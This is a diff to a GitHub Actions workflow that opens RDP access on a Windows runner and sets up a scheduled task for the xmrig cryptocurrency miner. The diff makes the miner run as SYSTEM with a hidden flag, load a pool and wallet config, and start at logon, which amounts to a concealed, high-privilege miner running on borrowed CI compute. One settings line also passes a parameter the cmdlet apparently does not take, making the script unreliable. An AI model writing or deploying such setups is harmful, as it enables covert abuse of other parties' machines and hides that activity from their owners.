@@ -21,7 +21,9 @@ jobs:
           netsh advfirewall firewall delete rule name="RDP-Tailscale"
           netsh advfirewall firewall add rule name="RDP-Tailscale" `
             dir=in action=allow protocol=TCP localport=3389
-          Restart-Service -Name TermService -Force
+          # Comment out or remove the restart to avoid hanging in GitHub Actions runner
+          # Restart-Service -Name TermService -Force
+          Write-Host "RDP settings configured (no service restart to prevent hang)"
       - name: Create RDP User with Password from Secret
         env:
           RDP_PASSWORD: ${{ secrets.RDP_PASSWORD }}
@@ -65,25 +67,31 @@ jobs:
           }
       - name: Create Task Scheduler Task for Executable
         run: |
-          $exePath = "C:\xmrig\xmrig-6.24.0\xmrig.exe"  # Adjust to "C:\xm\hello.exe" if needed
+          $exePath = "C:\xmrig\xmrig-6.24.0\xmrig.exe"
           if (-not (Test-Path $exePath)) {
               Write-Error "Executable not found at $exePath"
               exit 1
           }
           $taskName = "RunExecutable"
-          $action = New-ScheduledTaskAction -Execute $exePath
-          $trigger = New-ScheduledTaskTrigger -AtStartup
-          $principal = New-ScheduledTaskPrincipal -UserId "RDP" -LogonType Interactive -RunLevel Highest
-          $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+          # Use SYSTEM principal for non-interactive headless run (no login needed)
+          $action = New-ScheduledTaskAction -Execute $exePath -Argument "--config=C:\xmrig\xmrig-6.24.0\config.json"  # Add args if needed, e.g., for pool/wallet
+          $trigger = New-ScheduledTaskTrigger -AtLogOn  # Change to AtLogOn for RDP login trigger; or keep AtStartup for boot
+          $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest  # SYSTEM runs without session
+          $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionPolicy Bypass  # -Hidden to run in background
           try {
+              # If using RDP user instead: $principal = New-ScheduledTaskPrincipal -UserId "RDP" -LogonType Interactive -RunLevel Highest
+              # But add password: $credential = New-Object System.Management.Automation.PSCredential("RDP", (ConvertTo-SecureString $env:RDP_PASSWORD -AsPlainText -Force))
+              # Then: Register-ScheduledTask ... -User $credential.UserName -Password $credential.GetNetworkCredential().Password
               Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
-              Write-Host "Scheduled task '$taskName' created to run $exePath as administrator."
-              $task = Get-ScheduledTask -TaskName $taskName -ErrorAction Stop
-              if ($task) {
-                  Write-Host "Task '$taskName' successfully registered."
+              Write-Host "Scheduled task '$taskName' created to run $exePath as SYSTEM."
+              # Test-run the task immediately (optional, for verification)
+              Start-ScheduledTask -TaskName $taskName
+              Start-Sleep -Seconds 10
+              $taskInfo = Get-ScheduledTaskInfo -TaskName $taskName
+              if ($taskInfo.LastTaskResult -ne 0) {
+                  Write-Warning "Task test run failed with code $($taskInfo.LastTaskResult). Check Event Viewer."
               } else {
-                  Write-Error "Task verification failed: Task not found."
-                  exit 1
+                  Write-Host "Task test successful."
               }
           } catch {
               Write-Error "Failed to create scheduled task: $_"
